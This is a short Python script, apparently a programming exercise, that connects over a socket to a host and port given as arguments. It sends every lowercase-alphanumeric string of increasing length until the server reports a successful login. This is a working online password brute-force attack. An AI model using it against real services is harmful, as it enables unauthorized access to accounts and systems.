import sys
import socket
import itertools


def brute_force(client_socket):
    any_signs = 'abcdefghijklmnopqrstuvwxyz0123456789'

    password_length = 1
    while True:
        for possible_password in itertools.product(any_signs, repeat=password_length):
            possible_password = ''.join(possible_password)
            my_socket.send(possible_password.encode())

            response = my_socket.recv(1024).decode()
            if response == 'Connection success!':
                return possible_password
            elif response == 'Too many attempts':
                return None

        password_length += 1


args = sys.argv

with socket.socket() as my_socket:
    IP_address = args[1]
    port = int(args[2])

    my_socket.connect((IP_address, port))

    password = brute_force(my_socket)
    if password is not None:
        print(password)
